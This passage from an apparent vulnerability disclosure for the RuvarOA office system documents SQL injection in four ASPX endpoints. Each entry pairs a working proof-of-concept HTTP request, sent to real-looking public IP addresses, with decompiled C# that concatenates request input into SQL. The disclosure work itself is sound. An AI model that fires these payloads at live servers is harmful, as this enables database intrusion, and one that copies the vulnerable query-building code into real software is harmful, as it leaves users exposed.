<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302585405-bf410afa-c3f7-4e24-811c-217615bf3b77.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODU0MDUtYmY0MTBhZmEtYzNmNy00ZTI0LTgxMWMtMjE3NjE1YmYzYjc3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQxZTgxYzkxZjFjZTVhMmIwYzQ3MGE4MmY4NmRlZmEzNjNjZDlmYjY4ODBkMGIyMjg3NDdlNzFjZjYxYTJhNzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jj248FtZYYH_BN99gTvDQDaK1h9CU6H0Q-5XEbcSMQQ"><img width="1606" alt="image-20240127234616046" src="https://private-user-images.githubusercontent.com/18260135/302585405-bf410afa-c3f7-4e24-811c-217615bf3b77.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODU0MDUtYmY0MTBhZmEtYzNmNy00ZTI0LTgxMWMtMjE3NjE1YmYzYjc3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQxZTgxYzkxZjFjZTVhMmIwYzQ3MGE4MmY4NmRlZmEzNjNjZDlmYjY4ODBkMGIyMjg3NDdlNzFjZjYxYTJhNzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jj248FtZYYH_BN99gTvDQDaK1h9CU6H0Q-5XEbcSMQQ" style="max-width: 100%;"></a>
<pre><code>POST /ContractManage/get_company.aspx HTTP/1.1
Host: 119.131.131.101:8000
Content-Length: 581
Cache-Control: max-age=0
Origin: http://119.131.131.101:8000
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux i686) Gecko/20060204 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://119.131.131.101:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close

__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=/wEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYIAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WBB4WUGFnZXJfQ3VycmVudFBhZ2VJbmRleGYeEVBhZ2VyX1JlY29yZGNvdW50ZmRkAg0PFgIeBFRleHQFATBkZGkRakgZwcKyYwt4sQf48JqdFzMTXVIZFd8gYajJYD8E&amp;ddl_type=&amp;ddl_field=dw_bh&amp;txt_keyword=11'+UNION+ALL+SELECT+@@version--+CwAf&amp;btnSearch=%E6%9F%A5%E8%AF%A2&amp;pager_input=1&amp;pager_select=20&amp;txt_row_index=&amp;txt_dw_id=&amp;txt_dw_mc=&amp;txt_dw_bh=&amp;txt_dw_lxr=&amp;txt_dw_dh=

</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302585569-8042dc3a-6cbe-4fd5-9880-56700ada03eb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODU1NjktODA0MmRjM2EtNmNiZS00ZmQ1LTk4ODAtNTY3MDBhZGEwM2ViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTk1NjA2OTEwZjNhNWRkOTJlMmMwZDRlY2VlM2IwOWM0MGU1MjBjYmYwODI2ODIzMGExMTM4MTcwNWQyZjUxZWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.MelSPaz9FdVvwRmkSqayci4q3ZnzGOYH5tRcBLK8h6I"><img width="1609" alt="image-20240127234710514" src="https://private-user-images.githubusercontent.com/18260135/302585569-8042dc3a-6cbe-4fd5-9880-56700ada03eb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODU1NjktODA0MmRjM2EtNmNiZS00ZmQ1LTk4ODAtNTY3MDBhZGEwM2ViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTk1NjA2OTEwZjNhNWRkOTJlMmMwZDRlY2VlM2IwOWM0MGU1MjBjYmYwODI2ODIzMGExMTM4MTcwNWQyZjUxZWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.MelSPaz9FdVvwRmkSqayci4q3ZnzGOYH5tRcBLK8h6I" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-17" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function get_company within the DLL file /RuvarOA/bin/ContractManage.dll</p>
<pre><code>protected TextBox txt_keyword;

{
            string text2 = text;
            text = text2 + " and " + ((ListControl)ddl_field).SelectedValue + " like '%" + txt_keyword.Text + "%' ";
        }
        string format = "Exec DataPaging 'view_contract_company','*','id'," + pager.PageSize + "," + pager.CurrentPageIndex.ToString() + ",{0},0,'" + Common.FixQuote(text) + "','id'";
        DataView dataView = null;
</code></pre>
<p dir="auto">The direct use of TextBox #id txt_keyword to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">worklog_template_show.aspx</h3><a id="user-content-worklog_template_showaspx" class="anchor" aria-label="Permalink: worklog_template_show.aspx" href="#worklog_template_showaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-18" class="anchor" aria-label="Permalink: path" href="#path-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">PersonalAffair/worklog_template_show.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-18" class="anchor" aria-label="Permalink: POC" href="#poc-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /PersonalAffair/worklog_template_show.aspx?id=@@version HTTP/1.1
Content-Type: application/json
Host: 121.33.254.78:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-18" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function worklog_template_show within the DLL file /RuvarOA/bin/PersonalAffair.dll</p>
<pre><code>public class worklog_template_show : Page
{
    protected HtmlForm Form1;

    protected HtmlGenericControl divTitle;

    protected HtmlGenericControl divContent;

    protected Literal lt_visible;

    protected TextBox txt_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_id.Text = ((Page)this).Request.QueryString["id"];
            if (Validate.isNullOrSpace(txt_id.Text))
            {
                txt_id.Text = "0";
            }
            DataView dataView = SqlHelper.QueryView("select top 1 * from self_worklog_template where id=" + txt_id.Text);
            if (dataView.Count &gt; 0)
            {
                ((HtmlContainerControl)divTitle).InnerHtml = dataView[0]["blog_title"].ToString();
                ((HtmlContainerControl)divContent).InnerHtml = dataView[0]["blog_content"].ToString();
            }
            dataView.Dispose();
        }
    }
}
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">pm_gatt_inc.aspx</h3><a id="user-content-pm_gatt_incaspx" class="anchor" aria-label="Permalink: pm_gatt_inc.aspx" href="#pm_gatt_incaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-19" class="anchor" aria-label="Permalink: path" href="#path-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">ProjectManage/pm_gatt_inc.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-19" class="anchor" aria-label="Permalink: POC" href="#poc-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /ProjectManage/pm_gatt_inc.aspx?project_id=@@version HTTP/1.1
Host: 112.74.79.113:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-19" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function pm_gatt_inc within the DLL file /RuvarOA/bin/ProjectManage.dll</p>
<pre><code>public class pm_gatt_inc : Page
{
    protected HtmlForm form1;

    protected Literal lt_gatt_script;

    protected TextBox txt_project_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_project_id.Text = ((Page)this).Request.QueryString["project_id"];
            lt_gatt_script.Text = outProject();
        }
    }

    private string outProject()
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("&lt;script language=\"javascript\"&gt;\n");
        stringBuilder.Append(" function createChartControl(htmlDiv1){ \n ");
        DataView dataView = SqlHelper.QueryView("select * from project_info where id=" + txt_project_id.Text);
        if (dataView.Count &gt; 0)
        {
            stringBuilder.Append("var project" + txt_project_id.Text + " = new GanttProjectInfo(" + txt_project_id.Text + ", \"" + dataView[0]["pi_title"].ToString() + "\", new Date(" + DateTime.Parse(dataView[0]["pi_plan_bgdate"].ToString()).ToString("yyyy,M-1,d") + "));\n");
            stringBuilder.Append(outputTask("0"));
        }
        dataView = SqlHelper.QueryView("select * from project_task_info where project_id=" + txt_project_id.Text + " and task_parentid&lt;&gt;0 and task_level&gt;1 order by task_id asc");
        for (int i = 0; i &lt; dataView.Count; i++)
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["project_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">OfficeFileDownload.aspx</h3><a id="user-content-officefiledownloadaspx" class="anchor" aria-label="Permalink: OfficeFileDownload.aspx" href="#officefiledownloadaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-20" class="anchor" aria-label="Permalink: path" href="#path-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/OfficeFileDownload.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-20" class="anchor" aria-label="Permalink: POC" href="#poc-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
Host: 112.74.79.113:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302586608-0cfb19de-c79b-49eb-9093-83d49827d0b6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODY2MDgtMGNmYjE5ZGUtYzc5Yi00OWViLTkwOTMtODNkNDk4MjdkMGI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ0NmI2MDBhMGQzOWViOTk3YmQ0NzAzYjEzYjQ5OWEzMGQwYTYzMjk2MjRkMzE3YWU5NTZjYmMzNDdjZDFjOGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.sf9Mih5Omp51hg3FalTXNL6MS6LRDeqhirdZcEuX_n8"><img width="1583" alt="image-20240128001500612" src="https://private-user-images.githubusercontent.com/18260135/302586608-0cfb19de-c79b-49eb-9093-83d49827d0b6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODY2MDgtMGNmYjE5ZGUtYzc5Yi00OWViLTkwOTMtODNkNDk4MjdkMGI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ0NmI2MDBhMGQzOWViOTk3YmQ0NzAzYjEzYjQ5OWEzMGQwYTYzMjk2MjRkMzE3YWU5NTZjYmMzNDdjZDFjOGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.sf9Mih5Omp51hg3FalTXNL6MS6LRDeqhirdZcEuX_n8" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-20" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function OfficeFileDownload within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class OfficeFileDownload : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["filename"];
        string sQLString = "SELECT * FROM wf_office_file WHERE wordfile='" + text + "'  ";
